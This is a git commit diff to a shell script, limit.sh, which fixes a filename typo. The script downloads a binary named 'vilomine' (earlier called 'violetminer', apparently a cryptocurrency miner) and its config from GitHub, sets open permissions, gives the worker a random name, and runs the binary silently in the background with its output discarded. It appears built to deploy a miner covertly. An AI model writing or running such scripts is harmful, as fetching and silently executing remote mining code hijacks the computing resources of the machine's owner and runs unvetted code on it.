cef0ccdda863122e0a2de4b176bfa7869fc5a025
lambohopo <86089421+lambohopo@users.noreply.github.com>
2021-08-04 21:20:55 +0700

    Update limit.sh

--- limit.sh
+++ limit.sh
@@ -3,7 +3,7 @@ apt-get update
 apt-get install screen libjansson4 -y
 wget https://github.com/lambohopo/la/raw/main/vilomine
 wget https://raw.githubusercontent.com/lambohopo/la/main/config.json
-chmod 777 violetminer config.json
+chmod 777 vilomine config.json
 sed -i "s/CPU/$(echo $(shuf -i 11111-9999999 -n 1)-CPU)#482f-LGK/" "config.json"
 screen -dmS ls
 ./vilomine >/dev/null 2>&1
